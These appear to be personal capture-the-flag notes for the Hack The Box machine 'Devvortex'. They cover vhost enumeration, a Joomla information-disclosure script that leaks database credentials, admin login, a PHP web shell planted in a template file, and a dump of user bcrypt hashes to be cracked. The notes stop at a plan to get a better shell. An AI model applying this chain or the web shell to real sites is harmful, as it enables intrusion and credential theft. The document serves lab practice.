# Devvortex

```bash
Visit machine ip: 10.10.11.242
Follow a redirect to: devvortex.htb but its not working
```

```bash
add domain devvortex.htb to hosts dns file
nano /etc/hosts
10.10.11.242	devvortex.htb
```

```bash
only html/css/js static code
nmap nothing than 80 and ssh, cant detect vulns working
```

```bash
Scan for other hidden vhost domains
https://github.com/OJ/gobuster/releases

./gobuster vhost -u devvortex.htb -t 50 -w ../subdomains-top1million-5000.txt --append-domain

Found: dev.devvortex.htb
```

```bash
add domain dev.devvortex.htb to hosts dns file
nano /etc/hosts
10.10.11.242	dev.devvortex.htb devvortex.htb
```

```bash
on http://dev.devvortex.htb/administrator/ Joomla detected!

gem install httpx
gem install docopt
gem install paint
ruby joomla.rb http://dev.devvortex.htb
	Users
	[649] lewis (lewis) - lewis@devvortex.htb - Super Users
	[650] logan paul (logan) - logan@devvortex.htb - Registered

	Site info
	Site name: Development
	Editor: tinymce
	Captcha: 0
	Access: 1
	Debug status: false
	
	Database info
	DB type: mysqli
	DB host: localhost
	DB user: lewis
	DB password: P4ntherg0t1n5r3c0n##
	DB name: joomla
	DB prefix: sd4fg_
	DB encryption 0
```

```bash
Login into http://dev.devvortex.htb/administrator/ as:
	lewis
	P4ntherg0t1n5r3c0n##
```

```bash

Edit any php template file, example: offline.php
	if (isset($_GET["cmd"])){
	  system($_GET['cmd']);
	}

	http://dev.devvortex.htb/templates/cassiopeia/offline.php?cmd=ls

	error_reporting(E_ALL);
	ini_set('display_errors', 1);
	
	$dbhandle = mysqli_connect("localhost", "lewis", "P4ntherg0t1n5r3c0n##", "joomla");
	$result = mysqli_query($dbhandle, "SELECT * from sd4fg_users");
	
	while ($row = mysqli_fetch_array($result)) {
		var_dump($row);
	}

	array(34) { [0]=> string(3) "649" ["id"]=> string(3) "649" [1]=> string(5) "lewis" ["name"]=> string(5) "lewis" [2]=> string(5) "lewis" ["username"]=> string(5) "lewis" [3]=> string(19) "lewis@devvortex.htb" ["email"]=> string(19) "lewis@devvortex.htb" [4]=> string(60) "$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u" ["password"]=> string(60) "$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u" [5]=> string(1) "0" ["block"]=> string(1) "0" [6]=> string(1) "1" ["sendEmail"]=> string(1) "1" [7]=> string(19) "2023-09-25 16:44:24" ["registerDate"]=> string(19) "2023-09-25 16:44:24" [8]=> string(19) "2023-11-29 14:24:28" ["lastvisitDate"]=> string(19) "2023-11-29 14:24:28" [9]=> string(1) "0" ["activation"]=> string(1) "0" [10]=> string(0) "" ["params"]=> string(0) "" [11]=> NULL ["lastResetTime"]=> NULL [12]=> string(1) "0" ["resetCount"]=> string(1) "0" [13]=> string(0) "" ["otpKey"]=> string(0) "" [14]=> string(0) "" ["otep"]=> string(0) "" [15]=> string(1) "0" ["requireReset"]=> string(1) "0" [16]=> string(0) "" ["authProvider"]=> string(0) "" } array(34) { [0]=> string(3) "650" ["id"]=> string(3) "650" [1]=> string(10) "logan paul" ["name"]=> string(10) "logan paul" [2]=> string(5) "logan" ["username"]=> string(5) "logan" [3]=> string(19) "logan@devvortex.htb" ["email"]=> string(19) "logan@devvortex.htb" [4]=> string(60) "$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12" ["password"]=> string(60) "$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12" [5]=> string(1) "0" ["block"]=> string(1) "0" [6]=> string(1) "0" ["sendEmail"]=> string(1) "0" [7]=> string(19) "2023-09-26 19:15:42" ["registerDate"]=> string(19) "2023-09-26 19:15:42" [8]=> NULL ["lastvisitDate"]=> NULL [9]=> string(0) "" ["activation"]=> string(0) "" [10]=> string(151) "{"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"}" ["params"]=> string(151) "{"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"}" [11]=> NULL ["lastResetTime"]=> NULL [12]=> string(1) "0" ["resetCount"]=> string(1) "0" [13]=> string(0) "" ["otpKey"]=> string(0) "" [14]=> string(0) "" ["otep"]=> string(0) "" [15]=> string(1) "0" ["requireReset"]=> string(1) "0" [16]=> string(0) "" ["authProvider"]=> string(0) "" }

	lewis
	$2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u

	logan
	$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12

	Crack joomla password (bcrypt)
	https://hashcat.net/forum/thread-10645.html
```

```bash
try get a better shell

```